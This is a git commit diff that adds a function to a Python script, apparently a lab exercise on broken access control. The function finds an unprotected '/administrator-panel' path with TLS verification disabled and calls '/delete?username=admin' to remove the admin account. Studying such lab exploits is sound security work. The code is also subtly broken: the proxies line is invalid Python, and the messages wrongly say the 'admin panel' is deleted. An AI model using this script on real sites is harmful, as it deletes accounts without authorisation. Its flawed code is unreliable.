eeba15fb39980c38f3047fcca25f5b0f8f357252
nafeyah <nafeyahthenx@gmail.com>
2023-08-09 23:37:26 +0530

    Broken access 1

--- BrokenAccess1.py
+++ BrokenAccess1.py
@@ -5,6 +5,19 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies=('http': 'http://localhost:8080','https': 'https://localhost:8080')
 
+def delete_user(url):
+      admin_panel_url=url+'/administrator-panel'
+      r=requests.get(admin_panel_url,verify=False,proxies=proxies)
+      if r.status_code==200:
+            print("(+) Deleting admin panel...")
+            delete_user=admin_panel_url+"/delete?username=admin"
+            r=requests.get(delete_user,verify=False,proxies=proxies)
+            if r.status_code==200:
+                  print("(+) Admin panel deleted")
+            else:
+                  print("(-) Failed to delete admin panel")
+      else:
+                  print("(-) Failed to find admin panel")
 def main():
       if len(sys.argv)!=2:
             print("(+) Usage: %s <url>"%sys.argv[0])
